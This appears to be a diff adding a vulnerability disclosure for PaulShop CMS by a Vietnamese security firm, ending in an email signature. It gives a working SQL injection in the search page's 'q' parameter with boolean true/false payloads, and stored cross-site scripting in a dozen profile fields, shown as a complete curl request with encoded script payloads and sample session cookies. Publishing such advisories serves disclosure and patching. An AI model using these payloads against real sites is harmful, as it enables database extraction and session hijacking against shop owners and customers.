@@ -1,0 +1,64 @@
+# Exploit Title: PaulShop CMS - Sql Injection and stored XSS
+# Date: 07/23/2017
+# Exploit Author: BTIS Team (http://www.btis.vn)
+# Vendor Homepage: [https://codecanyon.net/item/paulshop-cms-with-shopping-cart-system/18070714]
+# Version: 03/27/2017
+# Tested on: Apache/2.4.7 (Ubuntu)
+# Contact: research@btis.vn
+# Can not contact vendor
+
+ 
+
+1. Description
+
+- SQL Injection on Search page with "q" parameter (GET)
+
+- Stored XSS on member's profile page with parameters: firstname, lastname, address, city, state, zipcode, phone, fax, delivery[address], delivery[city], delivery[state], delivery[zipcode]
+
+2. Examples
+
+ 
+
+- SQL injection: 
+
+ 
+
+# http://localhost/shop/en/category/tables?q=[SQL INJECTION HERE]
+
+# Payload: - True condition: europe' and 1=1)-- -
+
+           - False condition: europe' and 1=0)-- -
+
+ 
+
+- Stored XSS: 
+
+ 
+
+# Payload: %22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+
+# curl -X POST \
+
+  'http://localhost/shop/en/account?save=1' \
+
+  -H 'cookie: cookie: mysession_id=QyB45exW7W2fwIi; ci_session=ab1c04c51042f9928a87bb917b1a4759e9f81d11' \
+
+  -b 'cookie: mysession_id=QyB45exW7W2fwIi; ci_session=ab1c04c51042f9928a87bb917b1a4759e9f81d11' \
+
+  -d 'email=btis%40mailinator.com&password=123456xyz&firstname=BTIS%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&lastname=VN%22%3E%3Cscript%3Ealert%282%29%3C%2Fscript%3E&address=address%22%3E%3Cscript%3Ealert%283%29%3C%2Fscript%3E&city=city%22%3E%3Cscript%3Ealert%284%29%3C%2Fscript%3E&state=HCM%22%3E%3Cscript%3Ealert%287%29%3C%2Fscript%3E&zipcode=700000%22%3E%3Cscript%3Ealert%2812%29%3C%2Fscript%3E&country=VN&phone=%22%3E%3Cscript%3Ealert%2810%29%3C%2Fscript%3E&fax=fax%22%3E%3Cscript%3Ealert%286%29%3C%2Fscript%3E&delivery%5Baddress%5D=adr2%22%3E%3Cscript%3Ealert%285%29%3C%2Fscript%3E&delivery%5Bcity%5D=city2%22%3E%3Cscript%3Ealert%288%29%3C%2Fscript%3E&delivery%5Bstate%5D=MNB%22%3E%3Cscript%3Ealert%289%29%3C%2Fscript%3E&delivery%5Bzipcode%5D=800000%22%3E%3Cscript%3Ealert%2811%29%3C%2Fscript%3E&delivery%5Bcountry%5D=AD&save=Save'
+
+ 
+
+Quan Minh Tâm / Trưởng phòng kỹ thuật
+ <mailto:tamqm@btis.vn> tamqm@btis.vn / 01284 211 290
+
+CÔNG TY CÔNG NGHỆ BẢO TÍN 
+028 3810 6288 – 028 38106289
+5A Trần Văn Dư, phường 13, quận Tân Bình, Tp.Hồ Chí Minh
+ <http://www.btis.vn> www.btis.vn
+
+ 
+
+
+Email này đã được quét bằng tính năng bảo vệ diệt vi-rút của BullGuard.
+Để biết thêm thông tin, hãy truy cập www.bullguard.com <http://www.bullguard.com/tracking.aspx?affiliate=bullguard&buyaffiliate=smtp&url=/> 
